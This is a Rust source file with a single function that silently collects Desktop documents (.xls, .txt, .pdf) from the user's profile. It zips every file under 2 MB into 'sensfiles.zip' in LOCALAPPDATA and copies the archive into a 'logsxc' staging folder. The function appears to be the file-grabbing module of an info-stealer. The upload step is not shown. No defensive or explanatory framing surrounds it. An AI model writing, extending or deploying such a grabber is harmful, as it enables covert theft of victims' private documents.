use std::fs::*;
use std::io::*;
use zip::write::*;

pub fn grab_data() -> Option<String> {
    let filename = format!("{}/sensfiles.zip", &std::env::var("LOCALAPPDATA").unwrap());
    let path = std::path::Path::new(&filename);

    if let Ok(file) = std::fs::File::create(&path) {
        let mut zip_writer = zip::ZipWriter::new(file);
        let options = FileOptions::default().compression_method(zip::CompressionMethod::Stored);

        let glob_string = format!(
            r"{}/Desktop/*.{{xls,txt,pdf}}",
            &std::env::var("USERPROFILE").unwrap()
        );

        globwalk::glob_builder(&glob_string).max_depth(1).build()
            .ok()?
            .filter_map(|dent| dent.ok())
            .enumerate()
            .for_each(|(_idx, dent)| {
                let path = dent.path();
                if path.is_file() {
                    if let Ok(f) = &mut File::open(path) {
                        unsafe {
                            crate::FILES += 1;
                        }

                        let mut buffer: Vec<u8> = match &f.metadata() {
                            Ok(metadata) => Vec::with_capacity(metadata.len() as usize),
                            Err(_) => Vec::new(),
                        };

                        if buffer.capacity() >= 2097152 {
                            println!("{} is too large to be included in the archive", path.display());
                            return;
                        }


                        if f.read_to_end(&mut buffer).is_ok()
                            && zip_writer
                                .start_file(path.display().to_string(), options)
                                .is_ok()
                        {
                            let _ = zip_writer.write_all(&buffer);
                        }
                    }
                }
            });
        zip_writer.finish().ok()?;

        unsafe {
            if crate::FILES > 0 {
                std::fs::copy(
                    filename,
                    format!(
                        "{}\\logsxc\\sensfiles.zip",
                        &std::env::var("LOCALAPPDATA").unwrap()
                    ),
                )
                .ok();
            }
        }
    }
    Some("".to_string())
}
